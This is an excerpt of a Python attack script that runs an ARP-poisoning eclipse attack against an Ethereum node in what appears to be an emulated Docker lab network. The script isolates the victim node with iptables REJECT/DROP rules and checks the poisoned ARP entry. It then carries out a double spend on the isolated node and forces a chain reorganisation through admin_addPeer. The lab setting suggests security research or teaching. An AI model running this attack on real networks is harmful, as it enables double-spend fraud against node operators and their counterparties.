...
Topology:
  ...
  Attacker:    Node 160 (host_1)           10.160.0.72
...
Requires:
  ...
  - scapy available inside the attacker container (10.160.0.72)

Usage:
  python3 arp_eclipse_attack.py [--skip-reorg]   # --skip-reorg skips Phase 3
"""
...
CONTAINERS = {
    ...
    "attacker": "as160h-host_1-10.160.0.72",
}
RPC = {
...
VICTIM_IP  = "10.160.0.71"   # Node 160 (BootNode Miner in AS160)
...
def phase0_preflight():
    ...
    # 7. Show pre-attack balances (read from a healthy node)
    ...
    # 8. Check victim peer count (should be > 0 before attack)
    peers = get_peer_count(CONTAINERS[VICTIM])
    log_info(f"Node 160 peer count before attack: {peers}")
    if peers == 0:
        log_warn("Node 160 already has 0 peers — check network; it may not be connected")
    else:
...
# ──────────────────────────────────────────────
def phase1_eclipse():
    log_phase(1, "ECLIPSE ATTACK — ISOLATING NODE 160")
    global arp_proc
    ...
    log_info("Installing iptables DROP rules for Node 160 traffic …")
    rules = [
        f"iptables -A FORWARD -s {VICTIM_IP} -p tcp -j REJECT --reject-with tcp-reset",
        f"iptables -A FORWARD -d {VICTIM_IP} -p tcp -j REJECT --reject-with tcp-reset",
        f"iptables -A FORWARD -s {VICTIM_IP} -p udp -j DROP",
        f"iptables -A FORWARD -d {VICTIM_IP} -p udp -j DROP",
    ]
    for rule in rules:
    ...
    if not result:
        log_warn("Node 160 still has peers after 60s — eclipse may be partial. Continuing anyway.")
    else:
        log_ok("Eclipse confirmed! Node 160 has 0 peers — it is ISOLATED")

    # Verify ARP table poisoning
    log_info("Checking ARP table on Node 160 (router MAC should be attacker's) …")
    arp_table = docker_exec(CONTAINERS[VICTIM], f"ip neigh show {GATEWAY_IP}", check=False)
    log(f"  ARP entry for gateway: {arp_table}", YELLOW)

    log_ok("Phase 1 complete — Node 160 is eclipsed\n")
...
def phase2_double_spend(w3_real, w3_victim):
    ...
    # Victim node may have its miner stalled — verify and restart if needed
...
def phase3_reorg(w3_real, w3_victim, real_block_at_p2, fake_block_at_p2):
    ...
    # Force reconnection via addPeer using a healthy node's enode
    ...
    log_info("Calling admin_addPeer via JSON-RPC on Node 160 (victim) ...")
    try:
        body = _json.dumps({
        ...
        docker_exec(CONTAINERS[VICTIM],
                    "printf '%s' 'admin.addPeer("" + enode + "")' > /tmp/addpeer.js",
                    check=False)
        r = docker_exec(CONTAINERS[VICTIM],
    ...
    # Poll until Node 160 has peers again
    log_info("Waiting for Node 160 to reconnect to real network …")
    def has_peers():
        p = get_peer_count(CONTAINERS[VICTIM])
        log(f"  Node 160 peers: {p}", DIM)
        return p > 0
    ...
    if not result:
        log_warn("Node 160 still has no peers — may need manual intervention")
    else:
        log_ok("Node 160 reconnected to real network!")

    # Poll until Node 160 block height matches real world (reorg happened)
    log_info("Waiting for Node 160 to sync with real chain (reorg in progress) …")
    def chains_synced():
        try:
            r = w3_real.eth.block_number
            f = w3_victim.eth.block_number
    ...
    # ── Final balance check on Node 160 ─────────────────────────
...
def main():
    ...
    print(f"  {DIM}Attacker: Node 160  10.160.0.72{RESET}")
    print(f"  {DIM}Real net: Node 161  10.161.0.71  +  Node 162  10.162.0.71{RESET}\n")
    ...
    # Phase 2 — real reference is Node 161, victim is Node 160
    real_block, fake_block = phase2_double_spend(w3_161, w3_160)
    if max_phase == 2:
        log_ok("Stopped after double spend (--phase 2 / --skip-reorg)")
        log_warn("Node 160 is still isolated — run Phase 3 manually or flush iptables")
        return
